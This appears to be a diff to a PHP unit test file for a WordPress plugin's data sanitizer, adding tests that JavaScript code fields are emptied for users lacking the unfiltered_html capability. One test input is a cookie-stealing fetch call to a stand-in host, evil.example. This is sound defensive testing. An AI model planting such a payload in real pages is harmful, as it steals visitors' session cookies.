@@ -163,15 +163,40 @@ class DataSanitizerTest extends TestCase {
 	 * Test sanitizeCodeField preserves code formatting
 	 */
 	public function testSanitizeCodeFieldPreservesCode() {
+		$GLOBALS['yaml_cf_test_user_caps'] = ['unfiltered_html' => true];
 		$code = 'function hello() {
 	return "world";
 }';
 
 		$result = $this->sanitizer->sanitizeCodeField($code, 'javascript');
 
-		// Code should be preserved (wp_kses_post allows safe HTML)
 		$this->assertIsString($result);
 		$this->assertStringContains('function hello', $result);
+	}
+
+	/**
+	 * Test a JavaScript code field is emptied for users without unfiltered_html
+	 *
+	 * wp_kses_post() finds no markup in script source, so all of it would get
+	 * through, into the <script> element a theme prints it in.
+	 */
+	public function testJavaScriptCodeFieldIsEmptiedWithoutUnfilteredHtml() {
+		foreach (['js', 'javascript', 'JavaScript'] as $language) {
+			$result = $this->sanitizer->sanitizeCodeField('fetch("//evil.example/?c=" + document.cookie);', $language);
+
+			$this->assertSame('', $result, 'Language: ' . $language);
+		}
+	}
+
+	/**
+	 * Test an administrator's imported JavaScript survives, as it did before
+	 */
+	public function testJavaScriptCodeFieldFromAnImportIsKeptForUnfilteredHtmlUsers() {
+		$GLOBALS['yaml_cf_test_user_caps'] = ['unfiltered_html' => true];
+
+		$result = $this->sanitizer->forUntrustedSource()->sanitizeCodeField('track();', 'js');
+
+		$this->assertSame('track();', $result);
 	}
 
 	/**
